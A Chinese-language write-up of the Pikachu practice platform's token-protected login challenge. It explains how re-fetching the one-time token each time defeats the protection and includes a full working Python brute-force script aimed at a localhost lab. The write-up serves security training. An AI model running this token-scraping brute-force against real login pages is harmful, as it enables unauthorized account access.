【Pikachu】Web-暴力破解-Token防爆破 Writeup

操作者：何芊宏 | 操作日期：2026.9.27 | 分类：Pikachu | 标签：Pikachu, Web, 暴力破解, Token绕过, Python自动化

1. 题目信息

  • 平台：Pikachu 漏洞练习平台
  • 分类：Web - 暴力破解 (Burte Force)
  • 题目名称：Token 防爆破？
  • 目标：页面使用一次性 Token 防御 CSRF 和自动化爆破。需要通过脚本实现“动态提取 Token -> 构造请求 -> 提交爆破”的闭环，绕过防爆破机制。

2. 解题思路与知识点

漏洞原理：

为了防御爆破，开发者引入了动态 Token（每次提交后服务端验证并销毁，下一次页面刷新会产生新 Token）。但攻击者完全可以在提交请求前，先 GET 获取最新的 Token，再在同一个 Session 中立刻构造 POST 提交。由于脚本的提交速度极快，完全可以在 Token 的有效期内完成爆破。

第三关(客户端绕过)与第四关(Token防爆破)的区分判断：
  • 验证码绕过(on client)：抓包发现验证码在前端生成。修改 vcode=111111 重放，服务端依然返回“密码错误”，说明服务端根本没校验（前端校验是纸老虎）。
  • Token防爆破?：抓包发现请求体包含 token 参数。在 Repeater 中连续 Send 两次，第二次报错 Token错误（说明服务端执行了一次性校验，用后即焚）。

3. 操作步骤

第一步：抓包与漏洞特征确认

操作： 抓取登录请求，发现请求体为：username=admin&password=123456&token=538636ab891ef8a82e835845874c&submit=Login。

结论： 存在一次性动态 Token 防护，Burp Intruder 重放必定失效，需要编写自动化脚本动态刷新 Token。

第二步：Repeater 验证与关键字搜索

操作： 右键请求 -> Send to Repeater（Ctrl+R）。在 Repeater 界面直接点击 Send。

寻找回显： 在 Response 下方有一个 Search（搜索）输入框。输入关键字 success，发现右侧渲染页面中命中 1 match（匹配 1 处），并在源码第 933 行附近高亮显示了 <p>login success</p> 字样。这证明 admin/123456 恰好是正确的账号密码！（但是我还是继续了，毕竟不可能每一次都这么好运）

第三步：编写 Python 动态 Token 爆破脚本

操作： 使用 requests.Session() 维持会话，利用正则 re.search 在每次请求前提取最新 Token。

import requests
import re
import time

# ================== 配置区域 ==================
# 目标URL（确认 Pikachu 靶场的实际地址）
target_url = "http://127.0.0.1/pikachu/vul/burteforce/bf_token.php"

# 字典：为了演示循环过程和最终爆破成功的瞬间，将正确密码 '123456' 放在了字典末尾
users = ["admin", "test", "pikachu", "root"]
passwords = ["123", "000000", "abc123", "123456"]
# ==============================================

# 创建一个 Session 对象，维持整个流程的 Cookie 会话
# 至关重要：因为 Token 是绑定在服务器端 Session 上的，如果换了个 Cookie，Token 就会失效
session = requests.Session()

print("[*] 开始全自动动态 Token 爆破...")
print("-" * 50)

# 双重循环遍历用户名和密码字典
for user in users:
    for pwd in passwords:
        try:
            # 1. 【关键步】先 GET 请求登录页面，获取当前最新的 Token
            # 每次重放前必须重新 GET，因为之前的 Token 提交后已经被销毁
            get_res = session.get(target_url, timeout=5)
            
            # 2. 使用正则提取 Token 的值
            # 匹配规则：找 name="token" 以及紧随其后的 value="..."
            token_match = re.search(r'name="token"\s+value="(.*?)"', get_res.text)
            
            if not token_match:
                print("[!] 无法从页面提取 Token，请检查页面结构或正则表达式！")
                exit()
            
            current_token = token_match.group(1) # 提取出捕获组里的 Token 字符串
            
            # 3. 构造带最新 Token 的 POST 数据
            data = {
                "username": user,
                "password": pwd,
                "token": current_token,  # 塞入刚刚偷取的新鲜 Token
                "submit": "Login"
            }
            
            # 4. 发送 POST 请求执行爆破（使用同一个 session，确保 Cookie 和 Token 匹配）
            post_res = session.post(target_url, data=data, timeout=5)
            
            # 5. 精准判断请求结果
            # 注意：不能判断是否包含 "token"，因为失败页面也会重新渲染一个新的 token 字段
            if "login success" in post_res.text:
                print(f"\n[+] 爆破成功！账号: {user}  密码: {pwd}\n")
                print("[*] 任务完成，脚本退出。")
                exit() # 找到密码后立刻退出脚本
            elif "密码错误" in post_res.text or "不存在" in post_res.text:
                print(f"[-] 失败: {user}/{pwd} -> 账号或密码错误，自动进行下一次尝试...")
            else:
                print(f"[-] 失败: {user}/{pwd} -> 未知响应")
                
        except Exception as e:
            print(f"[!] 请求发生异常: {e}")
        
        time.sleep(0.2) # 轻微延时，避免请求过快把本地靶场打崩

print("-" * 50)
print("[*] 字典已跑完，未能爆破出正确密码。")

第四步：脚本运行结果

终端回显： 脚本自动获取 Token 并循环执行。前三个密码失败，最终在字典末尾跑出 [+] 爆破成功！账号: admin 密码: 123456。

4. 踩坑记录与复盘

  • 坑1：Repeater 手工测试的干扰与启发。在 Repeater 中重放请求时，一开始在 Response 里瞎找，找不到关键信息。后来**利用界面自带的 Search 框直接搜索 success**，快速定位到了成功回显。这也启发了我：在后续脚本中判断成功时，也应该直接提取这个关键字，而不是依赖于 Length 或状态码。
  • 坑2：脚本误报“Token校验失败”。在最初的脚本中，我使用 elif "token" in post_res.text.lower() 作为失败判断。结果当账号密码错误时，脚本也提示“Token失效”。
    原因排查：F12 查看响应源码发现，服务端在密码错误时，会重新渲染登录页面，而**这个页面 HTML 里天然包含了 name="token" 这个表单元素**。导致字符串匹配被误触发。
    解决办法：优化判断逻辑，只提取 login success 作为成功标志，并用“密码错误”等词作为失败判断，彻底避开由于页面结构带来的误报。

5. 知识总结

  • 手工验证与自动化利用的边界：手工测试用于证明“这个漏洞是真实存在的”，而编写脚本则用于证明“这个漏洞在效率上是可以被大规模利用的”。两者缺一不可，这是 WP 深度的重要体现。
  • 利用 Burp 搜索功能定位回显：在 Repeater 或 Intruder 中测试时，不要靠肉眼去翻找返回的 HTML。应该熟练使用 Ctrl+F 或底部的搜索框，精准搜索关键字（如 success、failed、error），这能帮你节省大量时间。
  • 动态 Token 并不能完全防爆破：Token 只能防住“固定的、被动重放”的攻击工具（如入门版 Burp Intruder）。面对具备主动抓取、动态构造能力的 Python 脚本或 Burp 专业版 Macro，这种防御依然会失效。
